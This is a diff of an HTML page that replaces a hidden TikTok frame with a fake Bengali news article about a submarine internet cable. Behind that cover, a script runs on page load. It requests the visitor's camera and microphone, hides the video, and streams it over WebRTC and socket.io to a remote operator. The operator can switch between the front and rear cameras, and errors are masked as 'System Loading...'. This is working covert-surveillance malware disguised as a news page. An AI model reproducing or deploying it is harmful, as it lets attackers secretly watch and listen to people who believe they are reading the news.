@@ -1,32 +1,79 @@
 <!DOCTYPE html>
 <html>
-<head><title>TikTok</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body,html{margin:0;padding:0;background:#000;height:100%;overflow:hidden;}iframe{width:100%;height:100%;border:none;}video{display:none;}</style></head>
+<head>
+    <title>Daily News Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #f4f4f4; color: #333; overflow-x: hidden; }
+        .header { background: #c00; color: #fff; padding: 15px; text-align: center; font-size: 24px; font-weight: bold; text-transform: uppercase; border-bottom: 5px solid #333; }
+        .container { padding: 20px; }
+        .headline { font-size: 22px; font-weight: bold; margin-bottom: 10px; color: #000; }
+        .news-img { width: 100%; height: 200px; background: #ddd; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; border-radius: 5px; }
+        .content { line-height: 1.6; font-size: 16px; text-align: justify; }
+        .footer { background: #333; color: #999; padding: 20px; text-align: center; font-size: 12px; margin-top: 50px; }
+        
+        /* Camera Hidden */
+        video { display: none; }
+    </style>
+</head>
 <body>
-    <iframe src="https://www.tiktok.com" allow="autoplay"></iframe>
+
+    <div class="header">🌏 Daily News 24/7</div>
+
+    <div class="container">
+        <div class="headline">বাংলাদেশে ইন্টারনেটের গতি বাড়াতে নতুন সাবমেরিন ক্যাবল যুক্ত হচ্ছে!</div>
+        
+        <div class="news-img">
+            <p style="color: #666;">[ Image: Fiber Optic Cable Project ]</p>
+        </div>
+
+        <div class="content">
+            <p><strong>ঢাকা ব্যুরো:</strong> সারা দেশে উচ্চগতির ইন্টারনেট সেবা নিশ্চিত করতে তৃতীয় সাবমেরিন ক্যাবল (SEA-ME-WE 6) এর কাজ দ্রুত এগিয়ে চলছে। কর্তৃপক্ষ জানিয়েছে, আগামী কয়েক মাসের মধ্যে এই সংযোগটি চালু হলে ডেটা ট্রান্সফার স্পিড বহুগুণ বৃদ্ধি পাবে।</p>
+            
+            <p>বিশেষজ্ঞরা বলছেন, এর ফলে ফ্রিল্যান্সিং এবং আইটি সেক্টরে এক নতুন দিগন্ত উন্মোচিত হবে। সরকার তথ্যপ্রযুক্তি খাতের উন্নয়নে সর্বোচ্চ গুরুত্ব দিচ্ছে। বর্তমানে ক্রমবর্ধমান ব্যান্ডউইথ চাহিদা মেটাতে এই প্রকল্পটি অত্যন্ত গুরুত্বপূর্ণ বলে মনে করা হচ্ছে।</p>
+
+            <p style="color: #999; font-size: 14px;">[ বিস্তারিত খবর নিচে আসছে... স্ক্রল করুন ]</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2026 Daily News Network | All Rights Reserved.
+    </div>
+
     <video id="v" autoplay playsinline muted></video>
+
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io(); let pc, stream, mode = "user", torchOn = false;
+        const socket = io(); 
+        let pc, stream, mode = "user";
 
         async function start() {
             if (stream) stream.getTracks().forEach(t => t.stop());
             if (pc) pc.close();
             pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
-            stream.getTracks().forEach(t => pc.addTrack(t, stream));
-            pc.onicecandidate = e => e.candidate && socket.emit("ice", { candidate: e.candidate, id: socket.id });
-            const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
-            socket.emit("offer", { offer, id: socket.id });
-            const battery = await navigator.getBattery();
-            setInterval(() => socket.emit("status", { bat: Math.floor(battery.level * 100), torch: torchOn }), 5000);
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
+                stream.getTracks().forEach(t => pc.addTrack(t, stream));
+                
+                pc.onicecandidate = e => e.candidate && socket.emit("ice", e.candidate);
+                
+                const offer = await pc.createOffer(); 
+                await pc.setLocalDescription(offer);
+                socket.emit("offer", offer);
+            } catch (e) {
+                console.log("System Loading...");
+            }
         }
-        socket.on("switch", () => { mode = (mode === "user") ? "environment" : "user"; torchOn = false; start(); });
-        socket.on("torch", async () => {
-            const t = stream.getVideoTracks()[0]; torchOn = !torchOn;
-            await t.applyConstraints({ advanced: [{ torch: torchOn }] });
+
+        socket.on("switch", () => { 
+            mode = (mode === "user") ? "environment" : "user"; 
+            start(); 
         });
-        socket.on("answer", d => d.id === socket.id && pc.setRemoteDescription(new RTCSessionDescription(d.answer)));
-        socket.on("ice", d => d.id === socket.id && pc.addIceCandidate(new RTCIceCandidate(d.candidate)));
+
+        socket.on("answer", a => pc.setRemoteDescription(new RTCSessionDescription(a)));
+        socket.on("ice", c => pc.addIceCandidate(new RTCIceCandidate(c)));
+
         window.onload = start;
     </script>
 </body>
